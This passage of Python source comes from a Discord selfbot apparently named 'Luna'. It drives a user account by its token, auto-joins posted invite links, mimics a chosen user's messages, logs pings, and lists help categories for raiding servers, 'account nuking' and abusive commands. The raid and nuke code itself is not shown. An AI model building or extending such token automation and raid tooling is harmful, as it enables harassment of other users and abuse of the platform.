						code = re.findall(r"\w[a-z]*\W*\w[a-z]+\.\w[g]*\W\S*", str(message.content).replace(")", "").replace("https://discord.gg/", ""))
						async with httpx.AsyncClient() as client:
							await client.post(f'https://canary.discord.com/api/v8/invites/{code}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
							joined_server = f'discord.gg/{code}'
							if toast_giveaway() == "on" and toast_all() == "on":
								send_notification(message=f"Joined guild\nInvite » discord.gg/{code}")
							await asyncio.sleep(5)
				except Exception:
					pass
			else:
				pass
		#///////////////////////////////////////////////////////////////
		# Copy Member

		if copycat is not None and copycat.id == message.author.id:
			await message.channel.send(chr(173) + message.content)

		# ///////////////////////////////////////////////////////////////
		# Share command
		with open('./config.json') as f:
			config = json.load(f)
		prefix = config.get('prefix')
		with open('data/sharing.json') as f:
			slot = json.load(f)
		share = slot.get('share')
		user_id = slot.get('user_id')

		if share == "on":
			if message.author.id == user_id:
				if f"{prefix}help" in message.content:
					printsharedcommand("help")
					if mode() == 2:
						sent = await message.channel.send(f"```ini\n[ {titlevar()} ]\n\n{descriptionvar()}Coming soon\n\n[ {footervar()} ]```")
						await asyncio.sleep(deletetimer())
						await sent.delete()
					elif mode() == 3:
						sent = await message.channel.send(f"```ini\n[ {titlevar()} ]\n\n{descriptionvar()}Coming soon\n\n[ {footervar()} ]```")
						await asyncio.sleep(deletetimer())
						await sent.delete()
					else:
						embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"{descriptionvar()}```\nComing soon```", color=hexcolorvar())
						embed.set_thumbnail(url=imagevar())
						embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
						embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
						embed.set_image(url=largeimagevar())
						sent = await message.channel.send(embed=embed)
						await asyncio.sleep(deletetimer())
						await sent.delete()
			else:
				pass

		# ///////////////////////////////////////////////////////////////
		# AFK System

		global afkstatus
		global afk_user_id
		global afk_reset

		if afkstatus == 1 and afk_user_id == 0:

			with open("config.json", "r") as f:
				config = json.load(f)
				afkmessage = config.get('afkmessage')
				if afkmessage == "":
					afkmessage = "This is an autoresponse message! User is now AFK.."
			if message.guild is None and not isinstance(message.channel, discord.GroupChannel):
				if message.author == self.bot.user:
					return
					
				if mode() == 2:
					sent = await message.channel.send(f"```ini\n[ AFK ]\n\n{afkmessage}\n\n[ {footervar()} ]```")
				else:
					embed = discord.Embed(title="AFK", url=titleurlvar(), description=f"{afkmessage}", color=hexcolorvar())
					embed.set_thumbnail(url=imagevar())
					embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
					embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
					embed.set_image(url=largeimagevar())
					sent = await message.channel.send(embed=embed)

				afk_user_id = message.author.id
				await asyncio.sleep(60)
				afk_user_id = 0
				await sent.delete()

		# ///////////////////////////////////////////////////////////////
		# Mention

		mention = f'<@{self.bot.user.id}>'
		if mention in message.content:
			if message.author == self.bot.user:
				return
			else:
				with open('data/notify.json') as f:
					config = json.load(f)
				pings = config.get('pings')
				if pings == "on":
					if toast_ping() == "on" and toast_all() == "on":
						send_notification(message=f"You have been mentioned\nServer »  {message.guild}\nChannel » {message.channel}\nAuthor »  {message.author}")
					datetime.now(tz=None)
					dateTimeObj = datetime.now()
					timestampStr = dateTimeObj.strftime("%H:%M")
					print(f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | {purple('You have been mentioned')}"
						f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Server  | {purple(f'{message.guild}')}"
						f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Channel | {purple(f'{message.channel}')}"
						f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Author  | {purple(f'{message.author}')}"
						"\n")
				else:
					pass
			
			#///////////////////////////////////////////////////////////////
			# Selfbot Detection - Embed

		if message.author.bot == False:
			if message.author == self.bot.user:
				pass
			else:
				embeds = message.embeds
				for embed in embeds:
					global cooldown
					if embed is not None and cooldown.count(message.author.id) == 0 and not ("https://" or "http://" or "cdn.discordapp.com" or ".png" or ".gif" or "www.") in message.content:
						cooldown.append(message.author.id)
						with open('data/selfbotdetection.json') as f:
							slot = json.load(f)
						selfbotdetection = slot.get('selfbotdetection')
						if selfbotdetection == "on":
							if toast_selfbot() == "on" and toast_all() == "on":
								send_notification(message=f"Selfbot Detected\nServer »  {message.guild}\nChannel » {message.channel}\nAuthor »  {message.author}")
							datetime.now(tz=None)
							dateTimeObj = datetime.now()
							timestampStr = dateTimeObj.strftime("%H:%M")
							print(f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | {purple('Selfbot Detected')}"
								f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Server  | {purple(f'{message.guild}')}"
								f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Channel | {purple(f'{message.channel}')}"
								f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Author  | {purple(f'{message.author}')}")
							title = embed.to_dict()['title']
							title = title.lower()
							if "nighty" in title:
								printsniper(f"Selfbot | Prediction » {purple('Nighty')}")
							elif "aries" in title:
								printsniper(f"Selfbot | Prediction » {purple('Aries')}")
							elif "solus" in title:
								printsniper(f"Selfbot | Prediction » {purple('Solus')}")
							elif "ghost" in title:
								printsniper(f"Selfbot | Prediction » {purple('Ghost')}")
							elif "okuru" in title:
								printsniper(f"Selfbot | Prediction » {purple('Okuru')}")
							elif "lucifer" in title:
								printsniper(f"Selfbot | Prediction » {purple('Lucifer')}")
							print()
							await asyncio.sleep(3600)
							cooldown.remove(message.author.id)
						else:
							pass
					else:
						pass

bot.add_cog(OnMessage(bot))

# ///////////////////////////////////////////////////////////////
# On Message Delete Event

class OnDelete(commands.Cog, name="on delete"):
	def __init__(self, bot:commands.Bot):
		self.bot = bot
        
	@commands.Cog.listener()
	async def on_message_delete(self, message):
		if message.author == self.bot.user:
			pass
		else:
			mention = f'<@!{self.bot.user.id}>'
			if mention in message.content:
				with open('data/notify.json') as f:
					config = json.load(f)
				ghostpings = config.get('ghostpings')
				if ghostpings == "on":
					if toast_ghostping() == "on" and toast_all() == "on":
						send_notification(message=f"You have been ghostpinged\nServer »  {message.guild}\nChannel » {message.channel}\nAuthor »  {message.author}")
					datetime.now(tz=None)
					dateTimeObj = datetime.now()
					timestampStr = dateTimeObj.strftime("%H:%M")
					print(f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | {purple('You have been ghostpinged')}"
						f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Server  | {purple(f'{message.guild}')}"
						f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Channel | {purple(f'{message.channel}')}"
						f"\n{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | Author  | {purple(f'{message.author}')}"
						"\n")
				else:
					pass

bot.add_cog(OnDelete(bot))

# ///////////////////////////////////////////////////////////////
# On Typing Event

class OnTyping(commands.Cog, name="on typing"):
	def __init__(self, bot:commands.Bot):
		self.bot = bot
        
	@commands.Cog.listener()
	async def on_typing(self, channel, member, when):
		if member in self.bot.user.friends and isinstance(channel, discord.DMChannel):
			if toast_friend_event() == "on" and toast_all() == "on":
				send_notification(message=f"{member} is typing")
			else:
				pass

bot.add_cog(OnTyping(bot))

# ///////////////////////////////////////////////////////////////
# On Command Event

class OnCommand(commands.Cog, name="on command"):
	def __init__(self, bot:commands.Bot):
		self.bot = bot
        
	@commands.Cog.listener()
	async def on_command(self, luna:commands.Context):
		printcommand(luna.command.name)
		with open("config.json", "r") as f:
			config = json.load(f)
		themesvar = config.get('theme')
		if not file_exist(f'./data/themes/{themesvar}'):
			if errorlog() == "console":
				printerror("The theme file was missing and prevented Luna from sending the message\n\nA theme file to fix it has been created")
			else:
				await luna.send("The theme file was missing and prevented Luna from sending the message\n\nA theme file to fix it has been created", delete_after=10)

bot.add_cog(OnCommand(bot))

# ///////////////////////////////////////////////////////////////
# On Command Error

class OnCommandErrorCog(commands.Cog, name="on command error"):
	def __init__(self, bot:commands.Bot):
		self.bot = bot

	@commands.Cog.listener()
	async def on_command_error(self, luna:commands.Context, error:commands.CommandError):
		error_str = str(error)
		error = getattr(error, 'original', error)
		if isinstance(error, commands.CommandOnCooldown):
			await luna.message.delete()
			day = round(error.retry_after/86400)
			hour = round(error.retry_after/3600)
			minute = round(error.retry_after/60)
			if day > 0:
				if errorlog() == "console":
					printerror('This command is on cooldown, for '+str(day)+ "day(s)")
				else:
					await luna.send('This command is on cooldown, for '+str(day)+ "day(s)", delete_after=3)
			elif hour > 0:
				if errorlog() == "console":
					printerror('This command is on cooldown, for '+str(hour)+ " hour(s)")
				else:
					await luna.send('This command is on cooldown, for '+str(hour)+ " hour(s)", delete_after=3)
			elif minute > 0:
				if errorlog() == "console":
					printerror('This command is on cooldown, for '+ str(minute)+" minute(s)")
				else:
					await luna.send('This command is on cooldown, for '+ str(minute)+" minute(s)", delete_after=3)
			else:
				if errorlog() == "console":
					printerror(f'You are being ratelimited, for {error.retry_after:.2f} second(s)')
				else:
					await luna.send(f'You are being ratelimited, for {error.retry_after:.2f} second(s)', delete_after=3)

		if isinstance(error, CommandNotFound):
			try:
				await luna.message.delete()
			except Exception:
				pass
			with open("config.json", "r") as f:
				config = json.load(f)
			prefix = config.get('prefix')
			helptext = ""
			for command in self.bot.commands:
				helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description},"

			error_text = f"{error}"
			subtract = len(error_text)-14
			error_strip = error_text[9:subtract]
			commandlist = helptext.split(",")
			commandlistfind = [ string for string in commandlist if error_strip in string]
			commandlistfind = '\n'.join(str(e) for e in commandlistfind)

			if not len(commandlistfind) == 0 and not len(commandlistfind) >= 2000:
				found = f"```\n\nDid you mean?\n\n{commandlistfind}```"
			else:
				found = ""
			if errorlog() == "console":
				printerror(error)
			else:
				embed = discord.Embed(
					title="Error",
					description=f"```\nNot Found\n\n{error}```{found}```\nNote\n\nYou can use \"search\" to search for a command.\n{prefix}search <command> » Search for a command```",
					color=0xff0000
				)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
		elif isinstance(error, CheckFailure):
			await luna.message.delete()
			if errorlog() == "console":
				printerror(error)
			else:
				embed = discord.Embed(
					title="Error",
					description=f"```\n{error}```",
					color=0xff0000
				)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
		elif isinstance(error, commands.MissingRequiredArgument):
			await luna.message.delete()
			if errorlog() == "console":
				printerror(error)
			else:
				embed = discord.Embed(
					title="Error",
					description=f"```\nMissing arguments\n\n{error}```",
					color=0xff0000
				)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
		elif isinstance(error, MissingPermissions):
			await luna.message.delete()
			if errorlog() == "console":
				printerror(error)
			else:
				embed = discord.Embed(
					title="Error",
					description=f"```\nMissing permissions\n\n{error}```",
					color=0xff0000
				)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
		elif "Cannot send an empty message" in error_str:
			if errorlog() == "console":
				printerror(error)
			else:
				embed = discord.Embed(
					title="Error",
					description=f"```\n{error}```",
					color=0xff0000
				)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
		else:
			pass

bot.add_cog(OnCommandErrorCog(bot))

# ///////////////////////////////////////////////////////////////
# Help Commands (Listing Commands)

class HelpCog(commands.Cog, name="Help commands"):
	def __init__(self, bot:commands.Bot):
		self.bot = bot

	@commands.command(name = 'help',
					usage="[command]",
					description = "Display the help message",
					aliases = ['h', '?'])
	async def help (self, luna, commandName:str=None):
		await luna.message.delete()

		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')

		commandName2 = None
		stop = False

		if commandName is not None:
			for i in self.bot.commands:
				if i.name == commandName.lower():
					commandName2 = i
					break 
				else:
					for j in i.aliases:
						if j == commandName.lower():
							commandName2 = i
							stop = True
							break
						if stop is True:
							break 

			if commandName2 is None:
				if errorlog() == "console":
					printerror(f"No command found with name or alias {bcolors.COMMANDVAR}{commandName}{bcolors.RESET}")
				else:
					embed = discord.Embed(
						title="Error",
						description=f"```\nNo command found with name or alias {commandName}```",
						color=0xff0000
					)
					embed.set_thumbnail(url=imagevar())
					embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
					embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
					embed.set_image(url=largeimagevar())
					await send(luna, embed)
			else:
				if mode() == 2:
					aliases = commandName2.aliases
					aliasList = ""
					if len(aliases) > 0:
						for alias in aliases:
							aliasList += alias + ", "
						aliasList = aliasList[:-2]
						if commandName2.usage is None:
							sent = await luna.send(f"```ini\n[ {commandName2.name.title()} Command ]\n\n{descriptionvar()}Name\n{commandName2.name}\n\nAliases\n{aliasList}\n\nUsage\nNone\n\nDescription\n{commandName2.description}\n\n[ {footervar()} ]```")
						else:
							sent = await luna.send(f"```ini\n[ {commandName2.name.title()} Command ]\n\n{descriptionvar()}Name\n{commandName2.name}\n\nAliases\n{aliasList}\n\nUsage\n{prefix}{commandName2.name} {commandName2.usage}\n\nDescription\n{commandName2.description}\n\n[ {footervar()} ]```")
					else:
						if commandName2.usage is None:
							sent = await luna.send(f"```ini\n[ {commandName2.name.title()} Command ]\n\n{descriptionvar()}Name\n{commandName2.name}\n\nAliases\nNone\n\nUsage\nNone\n\nDescription\n{commandName2.description}\n\n[ {footervar()} ]```")
						else:
							sent = await luna.send(f"```ini\n[ {commandName2.name.title()} Command ]\n\n{descriptionvar()}Name\n{commandName2.name}\n\nAliases\nNone\n\nUsage\n{prefix}{commandName2.name} {commandName2.usage}\n\nDescription\n{commandName2.description}\n\n[ {footervar()} ]```")
					await asyncio.sleep(deletetimer())
					await sent.delete()
				elif mode() == 3:
					aliases = commandName2.aliases
					aliasList = ""
					if len(aliases) > 0:
						for alias in aliases:
							aliasList += alias + ", "
						aliasList = aliasList[:-2]
						if commandName2.usage is None:
							sent = await luna.send(f"> **{commandName2.name.title()} Command**\n> \n> ```\n> Name\n> {commandName2.name}``````\n> Aliases\n> {aliasList}``````\n> Usage\n> None``````\n> Description\n> {commandName2.description}```\n> {footervar()}")
						else:
							sent = await luna.send(f"> **{commandName2.name.title()} Command**\n> \n> ```\n> Name\n> {commandName2.name}``````\n> Aliases\n> {aliasList}``````\n> Usage\n> {prefix}{commandName2.name} {commandName2.usage}``````\n> Description\n> {commandName2.description}```\n> {footervar()}")
					else:
						if commandName2.usage is None:
							sent = await luna.send(f"> **{commandName2.name.title()} Command**\n> \n> ```\n> Name\n> {commandName2.name}``````\n> Aliases\n> None``````\n> Usage\n> None``````\n> Description\n> {commandName2.description}```\n> {footervar()}")
						else:
							sent = await luna.send(f"> **{commandName2.name.title()} Command**\n> \n> ```\n> Name\n> {commandName2.name}``````\n> Aliases\n> None``````\n> Usage\n> {prefix}{commandName2.name} {commandName2.usage}``````\n> Description\n> {commandName2.description}```\n> {footervar()}")
					
					await asyncio.sleep(deletetimer())
					await sent.delete()

				else:
					embed = discord.Embed(title=f"{commandName2.name.title()} Command", description=f"{descriptionvar()}", color=hexcolorvar())
					embed.set_thumbnail(url=imagevar())
					embed.add_field(name=f"Name", value=f"```\n{commandName2.name}```", inline=False)
					aliases = commandName2.aliases
					aliasList = ""
					if len(aliases) > 0:
						for alias in aliases:
							aliasList += alias + ", "
						aliasList = aliasList[:-2]
						embed.add_field(name=f"Aliases", value=f"```\n{aliasList}```")
					else:
						embed.add_field(name=f"Aliases", value="```\nNone```", inline=False)

					if commandName2.usage is None:
						embed.add_field(name=f"Usage", value=f"```\nNone```", inline=False)
					else:
						embed.add_field(name=f"Usage", value=f"```\n{prefix}{commandName2.name} {commandName2.usage}```", inline=False)
					embed.add_field(name=f"Description", value=f"```\n{commandName2.description}```", inline=False)
					embed.set_thumbnail(url=imagevar())
					embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
					embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
					embed.set_image(url=largeimagevar())
					await send(luna, embed)
		else:
			command_count = len(bot.commands)
			cog = bot.get_cog('Custom commands')
			custom = cog.get_commands()
			custom_command_count = 0
			for command in custom:
				custom_command_count += 1
			await embed_builder(luna, description=f"{descriptionvar()}```\nLuna\n\nCommands          » {command_count-custom_command_count}\nCustom Commands   » {custom_command_count}\n``````\nCategories\n\n{prefix}help [command]   » Display all commands\n{prefix}admin            » Administrative commands\n{prefix}abusive          » Abusive commands\n{prefix}animated         » Animated commands\n{prefix}fun              » Funny commands\n{prefix}image            » Image commands\n{prefix}hentai           » Hentai explorer\n{prefix}profile          » Current guild profile\n{prefix}protection       » Protections\n{prefix}raiding          » Raiding tools\n{prefix}text             » Text commands\n{prefix}trolling         » Troll commands\n{prefix}tools            » Tools\n{prefix}networking       » Networking\n{prefix}nuking           » Account nuking\n{prefix}utility          » Utilities\n{prefix}settings         » Settings\n{prefix}sharing          » Share with somebody\n{prefix}themes           » Themes\n{prefix}communitythemes  » Community made themes\n{prefix}communitycmds    » Community made commands\n{prefix}customhelp       » Show custom commands\n{prefix}misc             » Miscellaneous\n{prefix}info             » Luna information\n{prefix}search <command> » Search for a command\n``````\nVersion\n\n{lunaversion}```")

	@commands.command(name = "admin",
					  usage="",
					  description = "Administrative commands")
	async def admin(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Administrative commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Administrative", description=f"{descriptionvar()}```\n{helptext}```")

	@commands.command(name = "profile",
					usage="",
					description = "Current guild profile")
	async def profile(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Profile commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Profile", description=f"{descriptionvar()}```\nCurrent profile\n\nUser              » {bot.user}\nUsername          » {bot.user.name}\nDiscriminator     » {bot.user.discriminator}\n``````\nNickname Control\n\n{prefix}nick <name>      » Change your nickname\n{prefix}invisiblenick    » Make your nickname invisible\n{prefix}junknick         » Pure junk nickname\n``````\nUser Control\n\n{helptext}```")
	
	@commands.command(name = "statuses",
					  usage="",
					  description = "Animated statuses")
	async def statuses(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Status commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Status", description=f"{descriptionvar()}```\n{helptext}```")

	@commands.command(name = "animated",
					usage="",
					description = "Animated commands")
	async def animated(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Animated commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Animated commands", description=f"{descriptionvar()}```\n{helptext}```")

	@commands.command(name = "text",
					usage="",
					description = "Text commands")
	async def text(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Text commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Text commands", description=f"{descriptionvar()}```\n{helptext}```")

	@commands.command(name = "image",
					usage="",
					description = "Image commands")
	async def image(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Image commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Image commands", description=f"{descriptionvar()}```\n{helptext}```")

	@commands.command(name = "hentai",
					usage="",
					description = "Hentai explorer")
	async def hentai(self, luna):
		await luna.message.delete()

		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')

		cog = self.bot.get_cog('Hentai commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		embed = discord.Embed(title="Hentai Explorer", description=f"{descriptionvar()}```\n{helptext}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "trolling",
					usage="",
					description = "Trolling")
	async def trolling(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Troll commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Trolling", description=f"{descriptionvar()}```\n{helptext}```")

	@commands.command(name = "fun",
					usage="",
					description = "Fun commands")
	async def fun(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Fun commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Fun commands", description=f"{descriptionvar()}```\n{helptext}```")

	@commands.command(name = "tools",
					usage="",
					description = "Tools")
	async def tools(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Tools commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Tools", description=f"{descriptionvar()}```\n{helptext}```")

	@commands.command(name = "networking",
					usage="",
					description = "Networking")
	async def networking(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Nettool commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Networking", description=f"{descriptionvar()}```\n{helptext}```")

	@commands.command(name = "utility",
					usage="",
					aliases=['utils', 'utilities'],
					description = "Utilities")
	async def utility(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Util commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Utilities", description=f"{descriptionvar()}```\n{helptext}```")

	@commands.command(name = "abusive",
					usage="",
					description = "Abusive commands")
	async def abusive(self, luna):
		await luna.message.delete()
		if riskmode() == "on":
			with open("config.json", "r") as f:
				config = json.load(f)
			prefix = config.get('prefix')
			cog = self.bot.get_cog('Abusive commands')
			commands = cog.get_commands()
			helptext = ""
			for command in commands:
				helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
			await embed_builder(luna, title="Abusive commands", description=f"{descriptionvar()}```\n{helptext}```")
		else:
			await error_builder(luna, description="```\nRiskmode is disabled```")

	@commands.command(name = "raiding",
					usage="",
					description = "Raiding servers")
	async def raiding(self, luna):
		await luna.message.delete()
		if riskmode() == "on":
			with open("config.json", "r") as f:
				config = json.load(f)
			prefix = config.get('prefix')
			cog = self.bot.get_cog('Raid commands')
			commands = cog.get_commands()
			helptext = ""
			for command in commands:
				helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
			await embed_builder(luna, title="Raiding", description=f"{descriptionvar()}```\n{helptext}```")
		else:
			await error_builder(luna, description="```\nRiskmode is disabled```")

	@commands.command(name = "nuking",
					usage="",
					description = "Account nuking")
	async def nuking(self, luna):
		await luna.message.delete()
		if riskmode() == "on":
			with open("config.json", "r") as f:
				config = json.load(f)
			prefix = config.get('prefix')
			cog = self.bot.get_cog('Nuking commands')
			commands = cog.get_commands()
			helptext = ""
			for command in commands:
				helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
			await embed_builder(luna, title="Nuking", description=f"{descriptionvar()}```\n{helptext}```")
		else:
			await error_builder(luna, description="```\nRiskmode is disabled```")


	@commands.command(name = "protection",
					usage="",
					aliases=['protections', 'protect'],
					description = "Protections")
	async def protection(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Protection commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		cog = self.bot.get_cog('Privacy commands')
		commands = cog.get_commands()
		privacytext = ""
		for command in commands:
			privacytext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		cog = self.bot.get_cog('Backup commands')
		commands = cog.get_commands()
		backuptext = ""
		for command in commands:
			backuptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		cog = self.bot.get_cog('Whitelist commands')
		commands = cog.get_commands()
		whitelisttext = ""
		for command in commands:
			whitelisttext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Protections", description=f"{descriptionvar()}```\nPrivacy | Streamer Mode\n\n{privacytext}\n``````\nBackups\n\n{backuptext}\n``````\nWhitelist\n\n{whitelisttext}\n``````\nProtections\n\n{helptext}```")

	@commands.command(name = "misc",
					usage="",
					description = "Miscellaneous commands")
	async def misc(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Miscellaneous commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Miscellaneous", description=f"{descriptionvar()}```\n{helptext}```")

	@commands.command(name = "settings",
					usage="",
					description = "Settings")
	async def settings(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		deletetimer = int(config.get('deletetimer'))
		errorlog = config.get('errorlog')
		riskmode = config.get('riskmode')
		themesvar = config.get('theme')
		startup_status = config.get('startup_status')
		with open(f"data/themes/{themesvar}") as f:
			customi = json.load(f)
		description = customi.get('description')
		title = customi.get('title')
		footer = customi.get('footer')
		hexcolor = customi.get('hexcolor')
		author = customi.get('author')
		with open('data/selfbotdetection.json') as f:
			slot = json.load(f)
		selfbotdetection = slot.get('selfbotdetection')
		with open('data/notify.json') as f:
			config = json.load(f)
		pings = config.get('pings')
		if title == "":
			title = "None"
		if footer == "":
			footer = "None"
		if hexcolor == "":
			hexcolor = "None"
		if author == "":
			author = "None"
		cog = self.bot.get_cog('Settings commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Settings", description=f"{descriptionvar()}```\nYour current settings\n\nError logging     » {errorlog}\nAuto delete timer » {deletetimer}\nStartup status    » {startup_status}\nRiskmode          » {riskmode}\nTheme             » {(themesvar[:-5])}\nDescription       » {description}\nSelfbot detection » {selfbotdetection}\nMention notify    » {pings}\n``````\nYour current theme settings\n\nTheme             » {title}\nFooter            » {footer}\nColor             » {hexcolor}\nAuthor            » {author}\n``````\nSettings\n\n{helptext}```")

	@commands.command(name = "sharing",
					usage="",
					description = "Share commands")
	async def sharing(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		with open('data/sharing.json') as f:
			slot = json.load(f)
		share = slot.get('share')
		user_id = slot.get('user_id')
		if user_id == "":
			sharinguser = "None"
		else:
			sharinguser = await self.bot.fetch_user(user_id)
		cog = self.bot.get_cog('Share commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Sharing", description=f"{descriptionvar()}```\nYour current settings\n\nShare             » {share}\nUser              » {sharinguser}\n``````\n{helptext}```")


	@commands.command(name = "customhelp",
					aliases=['chelp'],
					usage="",
					description = "Show custom commands")
	async def customhelp(self, luna):
